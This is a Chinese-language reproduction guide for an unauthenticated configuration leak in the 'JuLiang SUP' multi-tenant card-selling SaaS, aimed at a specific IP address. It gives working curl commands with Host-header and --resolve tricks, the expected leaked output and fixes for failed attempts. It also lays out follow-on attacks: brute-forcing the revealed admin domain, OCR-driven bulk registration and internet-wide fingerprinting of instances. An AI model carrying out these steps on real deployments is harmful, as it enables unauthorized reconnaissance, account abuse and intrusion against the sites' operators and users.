# 巨量SUP 多租户发卡站 /api/settings 与 /api/captcha 未授权读取

## 适用面 / 原理
巨量SUP 是白标多租户发卡（卡密/礼品卡寄售）SaaS。实例上 `/api/settings`、`/api/captcha`
落在鉴权中间件之外，访客态（无 Cookie/Token）可读。业务接口全部 401，
因此是**配置面信息泄露**（低危），主要用作指纹与后续横向铺垫，不是数据泄露本身。

同一 IP 往往挂多个租户，路由靠 Host 区分：
- 命中已绑定租户 → 200
- 未绑定域名 → `Domain is not available`

## 前置
- 目标 443 可达（HTTPS，证书多为自签 → `-k`）
- 拿得到该实例**已绑定的租户 Host**（证书 SAN / 跳转 Location / 首页静态资源域名 / 已知入口域）
- 无需账号、Cookie、Token、验证码
- 必须 `--noproxy '*'`，否则本机代理会污染结论

## 逐步复现

### 0) 确定 Host（关键步骤）
从历次响应的证书、Location、静态资源可达域名里挑一个，或直接使用已知入口域名：

```
export TARGET_IP=45.207.198.244
export VHOST=www.<tenant>.tld
```

可选：先做 Host 有效性判别，200/正常 JSON vs `Domain is not available`。

### 1) 读全量站点配置

```
curl.exe -sS -k --noproxy '*' --max-time 8 -D - \
  --resolve "$VHOST":443:"$TARGET_IP" \
  "https://$VHOST/api/settings"
```

等价 IP 直连姿势：

```
curl.exe -sS -k --noproxy '*' --max-time 8 -D - \
  -H "Host: $VHOST" "https://$TARGET_IP/api/settings"
```

实测期望（200）：

```
HTTP/1.1 200
Content-Type: application/json

{"code":0,"msg":"success","data":{
  "site_name":"<站点名>",
  "site_desc":"巨量SUP",
  "site_main_domains":"admin.<主域>",   <<< 后台/管理面横向的关键线索
  "current_version":"1.7.6",             <<< 精确版本，供查已知问题
  "guest_access":"0",
  "register_enabled":"1",
  ... }}
```

### 2) 取验证码（如需自动化注册拿低权账号）

```
curl.exe -sS -k --noproxy '*' --max-time 8 \
  -H "Host: $VHOST" "https://$TARGET_IP/api/captcha"
```

返回 200：`{"code":0,"data":{"captcha_id":"...","captcha_img":"data:image/png;base64,..."}}`
`captcha_id` 与图片成对下发，可直接喂 OCR/人工识别后接注册接口。

### 3) 阴性对照（必做）

```
curl.exe -sS -k --noproxy '*' -H "Host: $VHOST" "https://$TARGET_IP/api/goods"
```

期望 `401 {"code":401,"msg":"请先登录"}`。
—— 拿到说明泄露只限配置面，报告里别写成"越权读取业务数据"。

## 判据汇总
| 端点 | 成立表现 | 定性 |
|---|---|---|
| /api/settings | 200 + code:0 + site_desc/current_version/site_main_domains | 未授权配置泄露 |
| /api/captcha | 200 + captcha_id + captcha_img | 未授权验证码下发 |
| /api/goods 等 | 401 请先登录 | 阴性对照，确认鉴权仍在 |

## 失败常见原因
1. **Host 未绑定** → `Domain is not available`。换 Host，别急着判死；同一 IP 多租户，换一个域名可能就通了。
2. **走了本机代理** → 超时/证书/路由结论全乱，必须 `--noproxy '*'`。
3. **直连 IP 不带 Host / 不 --resolve** → 落到默认 vhost，容易 404。
4. **版本差异** → 1.7.6 的路径前缀是 `/api/`；其他版本若前端 bundle 用别的前缀（如 `/api/v1`），按其实际前缀拼。
5. 若 `/api/settings` 返回 401，说明该版本或部署已把配置接口放进鉴权，转去前端 bundle 找其它免鉴权接口。

## 落地后能干什么
- 精确版本 → 查该版本其它已知缺陷
- `site_main_domains` → 直指管理后台域名，作为下一步爆破/未授权面探测入口
- `register_enabled` / `guest_access` → 决定"自助注册"这条低成本拿号路线是否值得走
- `site_desc` 常直接回显"巨量SUP" → 跨站批量指纹，可用于全网快速识别同产品实例
